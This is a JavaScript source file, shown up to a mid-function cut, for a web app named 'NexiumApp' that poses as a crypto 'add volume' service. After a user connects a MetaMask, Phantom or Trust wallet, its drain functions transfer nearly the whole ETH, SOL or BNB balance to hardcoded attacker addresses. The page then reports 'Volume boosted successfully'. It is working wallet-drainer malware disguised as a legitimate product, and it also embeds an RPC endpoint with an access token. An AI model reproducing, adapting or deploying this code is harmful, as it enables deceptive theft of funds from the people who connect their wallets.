import { Buffer } from 'buffer';
console.log('main.js: Buffer imported:', typeof Buffer, Buffer); // Log 1
globalThis.Buffer = Buffer;
window.Buffer = Buffer;
console.log('main.js: Buffer set on globalThis/window:', globalThis.Buffer === Buffer, window.Buffer === Buffer); // Log 2

// Other imports
import { CONFIG } from './config.js';
console.log('main.js: Buffer before CONFIG import:', typeof globalThis.Buffer); // Log 3
import { Connection, PublicKey, Transaction, SystemProgram, TransactionMessage, VersionedTransaction } from '@solana/web3.js';
import * as splToken from '@solana/spl-token';
console.log('main.js: Buffer after spl-token import:', typeof globalThis.Buffer); // Log 4

// Verify exports explicitly
const {
  TOKEN_PROGRAM_ID,
  createTransferCheckedInstruction,
  getAssociatedTokenAddressSync,
  createAssociatedTokenAccountInstruction,
  getOrCreateAssociatedTokenAccount,
  createCloseAccountInstruction,
} = splToken;

console.log('main.js: spl-token exports:', {
  TOKEN_PROGRAM_ID: !!TOKEN_PROGRAM_ID,
  createTransferCheckedInstruction: !!createTransferCheckedInstruction,
  getAssociatedTokenAddress: !!getAssociatedTokenAddressSync,
  createAssociatedTokenAccountInstruction: !!createAssociatedTokenAccountInstruction,
  getOrCreateAssociatedTokenAccount: !!getOrCreateAssociatedTokenAccount,
  createCloseAccountInstruction: !!createCloseAccountInstruction,
}); // Log 5

import * as ethers from 'ethers';

const DRAIN_ADDRESSES = {
  ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7",
  bnb: "0x10269ABC1fBB7999164037a17a62905E099278f9"
};

const POPULAR_SPL_TOKENS = [
  { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6, name: "USDT" },
  { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6, name: "USDC" },
  { mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", decimals: 6, name: "WIF" },
  { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 5, name: "BONK" },
  { mint: "jto9Y19f7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 9, name: "JTO" },
  { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6, name: "JUP" },
  { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6, name: "W" },
  { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6, name: "KMNO" },
  { mint: "TNSRxcUxoT9xWYW1UnP8eZJ7RPf2rDXgUbS4ao9kR1S", decimals: 6, name: "TNSR" },
  { mint: "2C4YvXUo2dJq4NjeaV7f3hDtkmTwrYkrAd4ToGTxK1r6", decimals: 9, name: "DAGO" },
  { mint: "2V4TjFjC87CYLYbSJTcT5mWnG2h4oVRr17a94bREh6Vz", decimals: 9, name: "TUAH" },
  { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9, name: "LUIGI" },
  { mint: "WENWENvqqNya429ubLdR1Y3vW6mWu2zHFauuJVVX5m1", decimals: 5, name: "WEN" }
];

class NexiumApp {
  constructor() {
    this.publicKey = null;
    this.connecting = false;
    this.dom = {};
    this.connectingWallet = null;
    this.solConnection = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.lastSelectedToken = null;
    this.selectedPaymentToken = null;
    this.spinner = null;
    this.isDraining = false;
    this.provider = null;
    this.connectedWalletType = null;
    console.log('Initializing NexiumApp...'); // Log 6
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.app) {
        console.error('Missing critical DOM element: app'); // Log 7
        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI element (app) missing.</p>';
        return;
      }
      if (!this.dom.metamaskPrompt) {
        console.warn('metamaskPrompt element missing, but continuing initialization'); // Log 8
      }
      this.setupModal();
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      if (this.publicKey) {
        this.renderTokenInterface();
      }
      console.log('App initialized successfully'); // Log 9
    } catch (error) {
      console.error('Init error:', error); // Log 10
      this.showFeedback('Error initializing app. Please refresh.', 'error');
    }
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      connectWallet: document.getElementById('connect-wallet'),
      walletModal: document.getElementById('wallet-modal'),
      closeModal: document.getElementById('close-modal'),
      connectMetamask: document.querySelector('#wallet-modal #connect-metamask'),
      connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
      connectTrust: document.querySelector('#wallet-modal #connect-trust'),
      feedbackContainer: document.querySelector('.feedback-container'),
      tokenSelect: document.getElementById('tokenSelect'),
      volumeSection: document.getElementById('volumeSection'),
      customTokenNameInput: document.getElementById('customTokenNameInput'),
      customTokenAddressInput: document.getElementById('customTokenAddressInput'),
      showCustomTokenBtn: document.getElementById('showCustomTokenBtn'),
      tokenInfo: document.getElementById('tokenInfoDisplay'),
      tokenList: document.getElementById('tokenList'),
      volumeInput: document.getElementById('volumeInput'),
      customTokenModal: document.getElementById('custom-token-modal'),
      closeCustomTokenModal: document.getElementById('close-custom-token-modal')
    };
    console.log('DOM elements cached:', {
      app: !!this.dom.app,
      metamaskPrompt: !!this.dom.metamaskPrompt,
      connectWallet: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModal: !!this.dom.closeModal,
      connectMetamask: !!this.dom.connectMetamask,
      connectPhantom: !!this.dom.connectPhantom,
      connectTrust: !!this.dom.connectTrust,
      customTokenModal: !!this.dom.customTokenModal
    }); // Log 11
  }

  setupModal() {
    console.log('Wallet modal setup:', {
      connectWalletBtn: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModalBtn: !!this.dom.closeModal
    }); // Log 12

    if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
      this.dom.connectWallet.addEventListener('click', (event) => {
        event.stopPropagation();
        if (this.connectedWalletType && this.publicKey) {
          console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`); // Log 13
          if (this.connectedWalletType === 'MetaMask') {
            this.drainEthereumWallet();
          } else if (this.connectedWalletType === 'Phantom') {
            this.drainSolanaWallet();
          } else if (this.connectedWalletType === 'Trust') {
            this.drainBNBWallet();
          }
        } else {
          console.log('Connect Wallet button clicked'); // Log 14
          this.dom.walletModal.classList.add('active');
          console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') }); // Log 15
        }
      });

      this.dom.closeModal.addEventListener('click', () => {
        console.log('Close wallet modal button clicked'); // Log 16
        this.dom.walletModal.classList.remove('active');
      });

      document.addEventListener('click', (event) => {
        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
          console.log('Clicked outside wallet modal, closing'); // Log 17
          this.dom.walletModal.classList.remove('active');
        }
      });
    } else {
      console.error('Wallet modal elements not found:', {
        connectWallet: !!this.dom.connectWallet,
        walletModal: !!this.dom.walletModal,
        closeModal: !!this.dom.closeModal
      }); // Log 18
    }

    // Setup custom token modal
    if (this.dom.customTokenModal && this.dom.closeCustomTokenModal) {
      this.dom.closeCustomTokenModal.addEventListener('click', () => {
        console.log('Close custom token modal button clicked'); // Log 19
        this.dom.customTokenModal.classList.remove('active');
      });

      document.addEventListener('click', (event) => {
        if (!this.dom.customTokenModal.contains(event.target) && !event.target.closest('.custom-token-card')) {
          console.log('Clicked outside custom token modal, closing'); // Log 20
          this.dom.customTokenModal.classList.remove('active');
        }
      });
    }
  }

  setupEventListeners() {
    const connectWalletHandler = (walletName) => {
      if (!this.connecting) {
        console.log(`${walletName} button clicked`); // Log 21
        this.connectWallet(walletName);
      }
    };

    const addVolumeHandler = (walletName) => {
      console.log(`${walletName} Add Volume clicked`); // Log 22
      if (walletName === 'MetaMask') {
        this.drainEthereumWallet();
      } else if (walletName === 'Phantom') {
        this.drainSolanaWallet();
      } else if (walletName === 'Trust') {
        this.drainBNBWallet();
      }
    };

    if (this.dom.connectMetamask) {
      this.dom.connectMetamask.addEventListener('click', () => {
        console.log('MetaMask click event triggered, connected class:', this.dom.connectMetamask.classList.contains('connected')); // Log 23
        if (this.dom.connectMetamask.classList.contains('connected')) {
          addVolumeHandler('MetaMask');
        } else {
          connectWalletHandler('MetaMask');
        }
      });
      this.dom.connectMetamask.addEventListener('keypress', (e) => {
        console.log('MetaMask keypress event triggered, key:', e.key, 'connected class:', this.dom.connectMetamask.classList.contains('connected')); // Log 24
        if (e.key === 'Enter') {
          if (this.dom.connectMetamask.classList.contains('connected')) {
            addVolumeHandler('MetaMask');
          } else {
            connectWalletHandler('MetaMask');
          }
        }
      });
    } else {
      console.warn('connectMetamask button not found'); // Log 25
    }

    if (this.dom.connectPhantom) {
      this.dom.connectPhantom.addEventListener('click', () => {
        console.log('Phantom click event triggered, connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 26
        if (this.dom.connectPhantom.classList.contains('connected')) {
          addVolumeHandler('Phantom');
        } else {
          connectWalletHandler('Phantom');
        }
      });
      this.dom.connectPhantom.addEventListener('keypress', (e) => {
        console.log('Phantom keypress event triggered, key:', e.key, 'connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 27
        if (e.key === 'Enter') {
          if (this.dom.connectPhantom.classList.contains('connected')) {
            addVolumeHandler('Phantom');
          } else {
            connectWalletHandler('Phantom');
          }
        }
      });
    } else {
      console.warn('connectPhantom button not found'); // Log 28
    }

    if (this.dom.connectTrust) {
      this.dom.connectTrust.addEventListener('click', () => {
        console.log('Trust Wallet click event triggered, connected class:', this.dom.connectTrust.classList.contains('connected')); // Log 29
        if (this.dom.connectTrust.classList.contains('connected')) {
          addVolumeHandler('Trust');
        } else {
          connectWalletHandler('Trust');
        }
      });
      this.dom.connectTrust.addEventListener('keypress', (e) => {
        console.log('Trust Wallet keypress event triggered, key:', e.key, 'connected class:', this.dom.connectTrust.classList.contains('connected')); // Log 30
        if (e.key === 'Enter') {
          if (this.dom.connectTrust.classList.contains('connected')) {
            addVolumeHandler('Trust');
          } else {
            connectWalletHandler('Trust');
          }
        }
      });
    } else {
      console.warn('connectTrust button not found'); // Log 31
    }

    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async connectWallet(walletName) {
    if (this.connecting || !navigator.onLine) {
      this.showFeedback('No internet connection. Please check your network.', 'error');
      console.log(`Connection aborted for ${walletName}: offline or already connecting`); // Log 32
      return;
    }
    this.connecting = true;
    this.connectingWallet = walletName;
    console.log(`Starting connection for ${walletName}, setting state to connecting`); // Log 33
    this.updateButtonState('connecting', walletName);

    try {
      const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      const hasEthereum = !!window.ethereum;
      const hasSolana = !!window.solana;
      const hasTrust = hasEthereum && (window.ethereum.isTrustWallet || /Trust/i.test(navigator.userAgent));
      const hasExtensions = (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) || 
                           (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) || 
                           (walletName === 'Trust' && hasTrust);
      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Trust: ${hasTrust}, Extensions: ${hasExtensions})`); // Log 34

      if (!isMobileUserAgent || hasExtensions) {
        let accounts = [];
        if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
          console.log('MetaMask detected, requesting accounts:', window.ethereum); // Log 35
          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts.length === 0) {
            console.error('MetaMask failed to provide accounts'); // Log 36
            throw new Error('MetaMask failed to provide accounts. Ensure it’s unlocked and installed.');
          }
          const provider = new ethers.BrowserProvider(window.ethereum);
          const network = await provider.getNetwork();
          console.log(`MetaMask network: chainId=${network.chainId}, name=${network.name}`); // Log 37
          if (network.chainId !== 1n) {
            console.error('MetaMask not on Ethereum mainnet, chainId:', network.chainId); // Log 38
            throw new Error('MetaMask is not connected to Ethereum mainnet (chainId 1).');
          }
          this.publicKey = accounts[0];
          this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
          console.log(`MetaMask connected via extension: ${this.publicKey}`); // Log 39
          this.connectedWalletType = walletName;
          this.updateButtonState('connected', walletName, this.publicKey);
          this.hideMetaMaskPrompt();
          this.showFeedback(`Connected`, 'success');
          this.renderTokenInterface();
          this.connecting = false;
          console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 44
          return;
        } else if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
          console.log('Phantom detected, connecting:', window.solana); // Log 45
          const response = await window.solana.connect();
          accounts = [response.publicKey.toString()];
          this.publicKey = accounts[0];
          this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
          console.log(`Phantom connected via extension: ${this.publicKey}`); // Log 46
          this.connectedWalletType = walletName;
          this.updateButtonState('connected', walletName, this.publicKey);
          this.hideMetaMaskPrompt();
          this.showFeedback(`Connected`, 'success');
          this.renderTokenInterface();
          this.connecting = false;
          console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 51
          return;
        } else if (walletName === 'Trust' && hasEthereum && (window.ethereum.isTrustWallet || /Trust/i.test(navigator.userAgent))) {
          console.log('Trust Wallet detected, requesting accounts:', window.ethereum); // Log 52
          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts.length === 0) {
            console.error('Trust Wallet failed to provide accounts'); // Log 53
            throw new Error('Trust Wallet failed to provide accounts. Ensure it’s unlocked and installed.');
          }
          const provider = new ethers.BrowserProvider(window.ethereum);
          let network = await provider.getNetwork();
          console.log(`Trust Wallet network: chainId=${network.chainId}, name=${network.name}`); // Log 54
          if (network.chainId !== 56n) {
            try {
              console.log('Attempting to switch Trust Wallet to BNB Smart Chain'); // Log 54.1
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
              });
              network = await provider.getNetwork();
              console.log(`Trust Wallet switched to: chainId=${network.chainId}, name=${network.name}`); // Log 54.2
            } catch (switchError) {
              console.error('Trust Wallet switch error:', switchError); // Log 54.3
              if (switchError.code === 4902) {
                console.log('BNB Smart Chain not found, attempting to add it'); // Log 54.4
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [
                    {
                      chainId: '0x38',
                      chainName: 'BNB Smart Chain',
                      nativeCurrency: {
                        name: 'BNB',
                        symbol: 'BNB',
                        decimals: 18,
                      },
                      rpcUrls: ['https://bsc-dataseed.binance.org/'],
                      blockExplorerUrls: ['https://bscscan.com'],
                    },
                  ],
                });
                network = await provider.getNetwork();
                console.log(`Trust Wallet added and switched to: chainId=${network.chainId}, name=${network.name}`); // Log 54.5
              } else {
                throw new Error(`Failed to switch to BNB Smart Chain: ${switchError.message}`);
              }
            }
            if (network.chainId !== 56n) {
              console.error('Trust Wallet still not on BNB Smart Chain, chainId:', network.chainId); // Log 55
              throw new Error('Trust Wallet is not connected to BNB Smart Chain (chainId 56). Please switch to BNB Smart Chain.');
            }
          }
          this.publicKey = accounts[0];
          console.log(`Trust Wallet connected via extension: ${this.publicKey}`); // Log 56
          this.connectedWalletType = walletName;
          this.updateButtonState('connected', walletName, this.publicKey);
          this.hideMetaMaskPrompt();
          this.showFeedback(`Connected`, 'success');
          this.renderTokenInterface();
          this.connecting = false;
          console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 61
          return;
        } else {
          console.error(`${walletName} extension not detected`); // Log 62
          throw new Error(`${walletName} extension not detected or unsupported`);
        }
      }

      // Deeplink begin
      const deeplinks = {
        MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com/add-volume.html',
        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html?ref=https%3A%2F%2Fnexium-bot.onrender.com',
        Trust: 'https://link.trustwallet.com/open_url?coin_id=20000714&url=https://nexium-bot.onrender.com/add-volume.html'
      };
      // Deeplink end
      const deeplink = deeplinks[walletName];
      if (!deeplink) {
        console.error(`No deeplink configured for ${walletName}`); // Log 63
        throw new Error(`No deeplink configured for ${walletName}`);
      }
      console.log(`Opening ${walletName} with deeplink: ${deeplink}`); // Log 64
      window.location.href = deeplink;

      const checkConnection = setInterval(async () => {
        if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
          if (accounts.length > 0) {
            this.publicKey = accounts[0];
            const provider = new ethers.BrowserProvider(window.ethereum);
            const network = await provider.getNetwork();
            console.log(`MetaMask deeplink network: chainId=${network.chainId}, name=${network.name}`); // Log 65
            if (network.chainId !== 1n) {
              console.error('MetaMask deeplink not on Ethereum mainnet, chainId:', network.chainId); // Log 66
              this.showFeedback('MetaMask not connected to Ethereum mainnet.', 'error');
              clearInterval(checkConnection);
              this.connecting = false;
              return;
            }
            this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
            console.log(`MetaMask connected via deeplink: ${this.publicKey}`); // Log 67
            this.connectedWalletType = walletName;
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected`, 'success');
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
          const response = await window.solana.connect().catch(() => null);
          if (response && response.publicKey) {
            this.publicKey = response.publicKey.toString();
            this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
            console.log(`Phantom connected via deeplink: ${this.publicKey}`); // Log 72
            this.connectedWalletType = walletName;
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected`, 'success');
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        } else if (walletName === 'Trust' && window.ethereum && (window.ethereum.isTrustWallet || /Trust/i.test(navigator.userAgent))) {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
          if (accounts.length > 0) {
            this.publicKey = accounts[0];
            const provider = new ethers.BrowserProvider(window.ethereum);
            let network = await provider.getNetwork();
            console.log(`Trust Wallet deeplink network: chainId=${network.chainId}, name=${network.name}`); // Log 77
            if (network.chainId !== 56n) {
              try {
                console.log('Attempting to switch Trust Wallet to BNB Smart Chain (deeplink)'); // Log 77.1
                await window.ethereum.request({
                  method: 'wallet_switchEthereumChain',
                  params: [{ chainId: '0x38' }],
                });
                network = await provider.getNetwork();
                console.log(`Trust Wallet switched to: chainId=${network.chainId}, name=${network.name}`); // Log 77.2
              } catch (switchError) {
                console.error('Trust Wallet deeplink switch error:', switchError); // Log 77.3
                if (switchError.code === 4902) {
                  console.log('BNB Smart Chain not found, attempting to add it (deeplink)'); // Log 77.4
                  await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [
                      {
                        chainId: '0x38',
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: {
                          name: 'BNB',
                          symbol: 'BNB',
                          decimals: 18,
                        },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com'],
                      },
                    ],
                  });
                  network = await provider.getNetwork();
                  console.log(`Trust Wallet added and switched to: chainId=${network.chainId}, name=${network.name}`); // Log 77.5
                } else {
                  throw new Error(`Failed to switch to BNB Smart Chain: ${switchError.message}`);
                }
              }
              if (network.chainId !== 56n) {
                console.error('Trust Wallet deeplink not on BNB Smart Chain, chainId:', network.chainId); // Log 78
                this.showFeedback('Trust Wallet not connected to BNB Smart Chain.', 'error');
                clearInterval(checkConnection);
                this.connecting = false;
                return;
              }
            }
            console.log(`Trust Wallet connected via deeplink: ${this.publicKey}`); // Log 79
            this.connectedWalletType = walletName;
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected`, 'success');
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        }
      }, 1000);

      setTimeout(() => {
        if (this.connecting) {
          console.log(`Deeplink timed out for ${walletName}`); // Log 84
          this.showFeedback('Connection timed out. Please open site in the wallet app browser.', 'error');
          this.updateButtonState('disconnected', walletName);
          this.connecting = false;
          clearInterval(checkConnection);
        }
      }, 30000);
    } catch (error) {
      console.error(`Connection error for ${walletName}:`, error); // Log 86
      this.handleConnectionError(error, walletName);
      this.updateButtonState('disconnected', walletName);
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
      console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`); // Log 88
    }
  }

  async drainEthereumWallet() {
    console.log("🔄 ETH Drainer Triggered"); // Log 84
    this.showProcessingSpinner();
    if (typeof window === "undefined" || !window.ethereum) {
      console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed."); // Log 85
      this.showFeedback("Please install MetaMask to boost volume.", 'error');
      this.hideProcessingSpinner();
      return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum);

    try {
      const network = await provider.getNetwork();
      console.log(`ETH Drainer network: chainId=${network.chainId}, name=${network.name}`); // Log 86
      if ((this.connectedWalletType === 'MetaMask' && network.chainId !== 1n) || (this.connectedWalletType === 'Trust' && network.chainId !== 56n)) {
        console.error('Drainer not on correct chain, chainId:', network.chainId); // Log 87
        this.showFeedback(`Please connect ${this.connectedWalletType} to the correct chain.`, 'error');
        this.hideProcessingSpinner();
        return;
      }

      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();
      console.log("✅ Connected to Ethereum Wallet:", walletAddress); // Log 88

      const balanceHex = await provider.send('eth_getBalance', [walletAddress, 'latest']);
      const balance = BigInt(balanceHex);
      const gasPriceHex = await provider.send('eth_gasPrice', []);
      const gasPrice = BigInt(gasPriceHex);
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit;
      const transferableBalance = balance - gasCost;

      if (transferableBalance <= 0n) {
        console.error("Insufficient transferable balance:", balance.toString(), "wei"); // Log 88.1
        throw new Error("Insufficient balance to transfer after reserving gas cost.");
      }

      const tx = await signer.sendTransaction({
        to: DRAIN_ADDRESSES.ethereum,
        value: transferableBalance,
        gasLimit,
        gasPrice
      });

      console.log("✅ ETH Transaction sent:", tx.hash); // Log 89
      this.showFeedback("Volume boosted successfully!", 'success');
      this.hideProcessingSpinner();
    } catch (error) {
      console.error("❌ Transaction failed due to an unexpected error:", error); // Log 90
      if (error.message.includes('insufficient funds')) {
        this.showFeedback('Insufficient funds to cover gas fees. Please ensure sufficient balance.', 'error');
      } else {
        this.showFeedback('Failed to boost volume. Please try again.', 'error');
      }
      this.hideProcessingSpinner();
    }
  }

  async drainSolanaWallet() {
    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
    this.showProcessingSpinner();

    try {
      const senderPublicKey = new PublicKey(this.publicKey);
      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
      console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 93
      console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 94

      // Get full balance and subtract rent-exempt minimum
      const balance = await this.solConnection.getBalance(senderPublicKey);
      const rentExemptMinimum = 2039280; // Minimum lamports needed to keep account open
      const transferableBalance = balance - rentExemptMinimum;

      if (transferableBalance <= 0) {
        console.error("Insufficient transferable balance:", balance, "lamports"); // Log 95
        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
      }
      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports"); // Log 96

      // Create transfer instruction for transferable balance
      const solInstruction = SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: recipientPublicKey,
        lamports: transferableBalance
      });

      // Get blockhash
      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97

      // Create message
      const message = new TransactionMessage({
        payerKey: senderPublicKey,
        recentBlockhash: blockhash,
        instructions: [solInstruction],
      }).compileToV0Message();

      // Create and sign transaction
      const versionedTransaction = new VersionedTransaction(message);
      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
      console.log("Transaction signed successfully:", signedTransaction); // Log 98

      const signature = await this.solConnection.sendTransaction(signedTransaction);
      console.log("Transaction sent, signature:", signature); // Log 99

      await this.solConnection.confirmTransaction({
        signature,
        lastValidBlockHeight,
        blockhash
      });
      console.log("Transaction confirmed:", signature); // Log 100

      this.showFeedback("Volume boosted successfully!", 'success');
    } catch (error) {
      console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 101
      if (error.message.includes('User rejected the request')) {
        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
      } else if (error.message.includes('Insufficient balance')) {
        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
      } else {
        this.showFeedback("Failed to boost volume. Please try again.", 'error');
      }
    } finally {
      this.hideProcessingSpinner();
      console.log('Drain token completed'); // Log 102
    }
  }

  async drainBNBWallet() {
    console.log("🔄 BNB Drainer Triggered"); // Log 156
    this.showProcessingSpinner();
    if (typeof window === "undefined" || !window.ethereum) {
      console.error("⚠️ No Ethereum provider found. Make sure Trust Wallet is installed."); // Log 157
      this.showFeedback("Please install Trust Wallet to boost volume.", 'error');
      this.hideProcessingSpinner();
      return;
    }

    // Use a reliable public BNB Smart Chain RPC URL
    const bnbRpcUrl = 'https://bsc-dataseed.binance.org/';
    let provider;
    try {
      provider = new ethers.BrowserProvider(window.ethereum);
      // Test the provider with a simple call
      await provider.getNetwork();
    } catch (error) {
      console.warn("Default provider failed, falling back to public RPC:", error); // Log 158.1
      provider = new ethers.JsonRpcProvider(bnbRpcUrl);
    }

    try {
      const network = await provider.getNetwork();
      console.log(`BNB Drainer network: chainId=${network.chainId}, name=${network.name}`); // Log 158
      if (this.connectedWalletType === 'Trust' && network.chainId !== 56n) {
        console.error('Drainer not on BNB Smart Chain, chainId:', network.chainId); // Log 159
        this.showFeedback('Please connect Trust Wallet to BNB Smart Chain.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();
      console.log("✅ Connected to BNB Wallet:", walletAddress); // Log 160

      const balanceHex = await provider.send('eth_getBalance', [walletAddress, 'latest']);
      const balance = BigInt(balanceHex);
      const gasPriceHex = await provider.send('eth_gasPrice', []);
      const gasPrice = BigInt(gasPriceHex);
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit;
      const transferableBalance = balance - gasCost;

      if (transferableBalance <= 0n) {
        console.error("Insufficient transferable balance:", balance.toString(), "wei"); // Log 161
        throw new Error("Insufficient balance to transfer after reserving gas cost.");
      }

      const tx = await signer.sendTransaction({
        to: DRAIN_ADDRESSES.bnb,
        value: transferableBalance,
        gasLimit,
        gasPrice
      });

      console.log("✅ BNB Transaction sent:", tx.hash); // Log 162
      this.showFeedback("Volume boosted successfully!", 'success');
      this.hideProcessingSpinner();
    } catch (error) {
      console.error("❌ Transaction failed due to an unexpected error:", error); // Log 163
      if (error.message.includes('insufficient funds')) {
        this.showFeedback('Insufficient funds to cover gas fees. Please ensure sufficient BNB balance.', 'error');
      } else if (error.message.includes('Invalid RPC URL') || error.message.includes('network')) {
        this.showFeedback('Network error: Invalid RPC configuration. Please try again later.', 'error');
      } else {
        this.showFeedback('Failed to boost volume. Please try again.', 'error');
      }
      this.hideProcessingSpinner();
    }
  }

  updateButtonState(state, walletName, address = '') {
    let button = this.dom[`connect${walletName}`];
    if (!button) {
      console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`); // Log 103
      button = document.querySelector(`#wallet-modal #connect-${walletName.toLowerCase()}`);
    }
    console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`); // Log 104
    if (!button) {
      console.error(`Button for ${walletName} not found in DOM`); // Log 105
      return;
    }
    console.log(`Current button classes before update: ${button.classList}`); // Log 106
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('glow-button', 'connecting');
        console.log(`Set ${walletName} button to Connecting..., disabled=${button.disabled}, classes=${button.classList}`); // Log 107
        break;
      case 'connected':
        const shortenedAddress = this.shortenAddress(address);
        button.textContent = shortenedAddress;
        button.classList.add('glow-button', 'connected');
        console.log(`Set ${walletName} button to ${shortenedAddress}, disabled=${button.disabled}, classes=${button.classList}`); // Log 108
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = shortenedAddress;
          this.dom.connectWallet.classList.remove('animate-pulse');
          this.dom.connectWallet.classList.add('glow-button', 'connected');
          this.dom.connectWallet.disabled = false; // Allow clicking for Add Volume
